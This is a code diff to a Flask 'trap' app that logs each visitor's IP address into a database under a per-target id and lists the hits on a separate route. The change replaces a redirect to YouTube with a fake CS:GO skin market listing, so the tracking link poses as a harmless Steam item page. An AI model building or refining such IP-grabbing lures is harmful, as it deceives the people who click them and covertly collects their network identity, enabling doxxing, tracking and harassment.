@@ -1,6 +1,6 @@
 import os, sqlite3, requests, json
 from datetime import datetime
-from flask import Flask, request, redirect
+from flask import Flask, request, render_template_string
 
 app = Flask(__name__)
 
@@ -14,7 +14,30 @@ def init_db():
     db.commit()
     return db
 
-@app.route("/g/<uid>")
+SKIN_PAGE = """
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="utf-8">
+<title>AK-47 | Redline — CS:GO Skins Market</title>
+<style>
+body{font-family:Arial;background:#1b2838;color:#c7d5e0;margin:0;padding:40px;text-align:center}
+h1{color:#66c0f4;font-weight:400}
+img{max-width:600px;border-radius:8px;box-shadow:0 4px 20px #0008}
+.price{font-size:24px;color:#a4d007;margin-top:20px}
+.btn{display:inline-block;margin-top:20px;padding:12px 32px;background:#5c7e10;color:#fff;text-decoration:none;border-radius:4px}
+</style>
+</head>
+<body>
+<h1>AK-47 | Redline (Field-Tested)</h1>
+<img src="https://community.cloudflare.steamstatic.com/economy/image/-9aPaXzG3XfLcVxQ/360fx360f" alt="AK-47 Redline">
+<div class="price">2 450 ₽</div>
+<a class="btn" href="https://steamcommunity.com/market/">Купить на Steam Market</a>
+</body>
+</html>
+"""
+
+@app.route("/skin/<uid>")
 def trap(uid):
     ip = request.headers.get("X-Forwarded-For", request.remote_addr)
     if ip and "," in ip:
@@ -39,7 +62,7 @@ def trap(uid):
     db.commit()
     db.close()
 
-    return redirect("https://www.youtube.com/")
+    return render_template_string(SKIN_PAGE)
 
 @app.route("/hits")
 def hits():
